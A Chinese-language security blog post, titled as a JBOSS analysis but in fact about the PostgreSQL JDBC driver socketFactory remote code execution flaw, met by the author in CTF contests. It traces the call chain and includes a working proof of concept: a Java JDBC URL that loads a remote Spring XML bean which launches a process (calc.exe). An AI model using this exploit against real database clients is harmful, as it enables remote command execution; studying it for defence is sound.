---
layout: post
title: JBOSS漏洞分析
categories: [blog ]
tags: [Java,]
description: ""
image:
  feature: windows.jpg
  credit: JYcxk
  creditlink: shzqi
---

 

## 前言

```java
在冀信杯中就看到过这个漏洞，当时只是利用没看原理，直接打的远程xml命令执行，在后来的安洵杯也遇到了，只不过用的是另外的任意文件写入，特别来跟一下流程。
```

## 任意代码执行 socketFactory/socketFactoryArg

​	影响范围：

- REL9.4.1208 <= PostgreSQL <42.2.25
- 42.3.0 <= PostgreSQL < 42.3.2

这个漏洞主要产生的原因是，`org.postgresql.util.ObjectFactory` 里面调用了`instantiate` 方法

![image-20231224205642825](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231224205642825.png)

大概意思就是对classname类名的String构造方法，赋值stringarg并进行初始化

`任意执行某个类的string构造方法`，因此只要找到一个符合这样条件的类即可

![image-20231224205955928](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231224205955928.png)

传入的参数都是通过 `Properties info`来获得的，所以能直接反射修改:

#### 调用链子

```java
instantiate:62, ObjectFactory (org.postgresql.util)
getSocketFactory:39, SocketFactoryFactory (org.postgresql.core)
openConnectionImpl:184, ConnectionFactoryImpl (org.postgresql.core.v3)
openConnection:51, ConnectionFactory (org.postgresql.core)
<init>:225, PgConnection (org.postgresql.jdbc)
makeConnection:466, Driver (org.postgresql)
connect:265, Driver (org.postgresql)
getConnection:664, DriverManager (java.sql)
getConnection:270, DriverManager (java.sql)
```

### 漏洞利用

通过加载远程恶意XML实现RCE，先看一个案例

```java
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.SQLException;

public class cve2022 {
    public static void main(String[] args) throws SQLException, SQLException {
        String socketFactoryClass = "org.springframework.context.support.ClassPathXmlApplicationContext";
        String socketFactoryArg = "http://127.0.0.1:9999/poc.xml";
        String jdbcUrl = "jdbc:postgresql://127.0.0.1:5432/test/?socketFactory="+socketFactoryClass+ "&socketFactoryArg="+socketFactoryArg;
        Connection connection = DriverManager.getConnection(jdbcUrl);
    }
}
```

```xml
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xmlns:p="http://www.springframework.org/schema/p"
       xsi:schemaLocation="http://www.springframework.org/schema/beans
        http://www.springframework.org/schema/beans/spring-beans.xsd">
<!--    普通方式创建类-->
   <bean id="exec" class="java.lang.ProcessBuilder" init-method="start">
        <constructor-arg>
          <list>
           
            <value>calc.exe</value>
          </list>
        </constructor-arg>
    </bean>
</beans>
```

![image-20231224212159159](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231224212159159.png)

关键的地方在`org.postgresql.Driver#connect` ,这里通过parseURL对传入的url进行了解析存入了prpos也就是info中

![image-20231224213235810](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231224213235810.png)

进入导致传入`ObjectFactory ` 的形参都是可控的，这里初始化的是

`org.springframework.context.support.ClassPathXmlApplicationContext`

![image-20231224213416888](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231224213416888.png)

![image-20231224213602623](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231224213602623.png)

这两个类都可以执行xml代码

![image-20231224220156639](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231224220156639.png)

```java
是通过远程加载 bean 配置文件，利用初始化 ProcessImpl 类的 bean 的过程，将任意字符串作为命令行执行内容注入，达到任意命令行命令执行的效果,也就是远程加载xml文件进行解析。
```

#### 调用链子

![image-20231224220724248](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231224220724248.png)
